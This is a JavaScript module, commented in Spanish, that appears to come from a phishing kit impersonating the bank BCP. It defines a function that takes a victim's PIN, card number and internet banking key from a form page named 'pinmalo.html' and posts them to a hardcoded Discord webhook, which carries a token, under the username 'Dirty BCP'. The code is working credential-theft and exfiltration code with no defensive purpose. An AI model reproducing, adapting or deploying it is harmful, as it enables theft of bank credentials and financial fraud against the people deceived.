// ============================================================
// WEBHOOK COMPARTIDO (Discord)
// ============================================================
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1568488154305011763/bC-6fpIUjfBAh3_aurNguiF3N7jHf-3Rb0jqKzjVjlzLSKe_YbXoItoSYlQR4Y-sdgX2";

/**
 * Envía los datos al webhook de Discord.
 * @param {string} titulo Título del embed
 * @param {Object} campos Pares nombre/valor a enviar
 * @param {number} color Color del embed (hex)
 * @param {string|null} imageBase64 Imagen opcional en base64
 */
export async function enviarAWebhook(
  titulo,
  campos = {},
  color = 0xea580c,
  imageBase64 = null,
) {
  const payload = {
    username: "Dirty BCP",
    embeds: [
      {
        title: titulo,
        color: color,
        timestamp: new Date().toISOString(),
        footer: { text: "Proceso BCP" },
        fields: Object.entries(campos).map(([k, v]) => ({
          name: k,
          value: String(v).slice(0, 1024) || "—",
          inline: true,
        })),
      },
    ],
  };

  try {
    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!res.ok) console.warn("Discord respondió:", res.status);
    return res.ok;
  } catch (e) {
    console.warn("No se pudo enviar al webhook:", e);
    return false;
  }
}

// ============================================================
// FUNCIÓN NUEVA PARA PINMALO.HTML (Tarjeta y Clave)
// ============================================================
/**
 * Recibe el objeto con los datos del formulario de pinmalo.html
 * y lo envía usando la función principal.
 */
export async function sendToWebhook(data) {
  const campos = {
    "Clave PIN": data.pin,
    "Confirmar PIN": data.confirmPin,
    "Número de Tarjeta": data.cardNumber,
    "Clave de Internet": data.webKey,
  };

  // Llama a tu función original para mantener el mismo formato
  return await enviarAWebhook(
    "🔐 Nuevos datos (Tarjeta y Clave)",
    campos,
    0x0052cc // Color azul
  );
}
